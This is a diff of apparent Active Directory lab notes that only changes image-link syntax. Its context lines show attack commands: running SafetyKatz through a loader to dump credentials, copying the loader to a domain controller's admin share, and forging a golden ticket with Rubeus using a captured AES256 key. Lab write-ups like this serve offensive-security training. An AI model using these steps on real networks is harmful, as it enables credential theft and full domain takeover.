@@ -1,5 +1,5 @@
 
-![[Pasted image 20250617143706.png]]
+![Pasted image 20250617143706](Pasted%20image%2020250617143706.png)
 
 # Q1
 
@@ -8,7 +8,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-
 exit
 ```
 
-![[Pasted image 20250617144254.png]]
+![Pasted image 20250617144254](Pasted%20image%2020250617144254.png)
 
 ```
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\c$\Users\Public\Loader.exe
@@ -44,7 +44,7 @@ the /aes key is the one we captured in Q1
 
 the sid is of our curret domain
 
-![[Pasted image 20250617145855.png]]
+![Pasted image 20250617145855](Pasted%20image%2020250617145855.png)
 
 ```
 C:\AD\Tools\Loader.exe path C:\AD\Tools\Rubeus.exe args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5ABC3CDA848
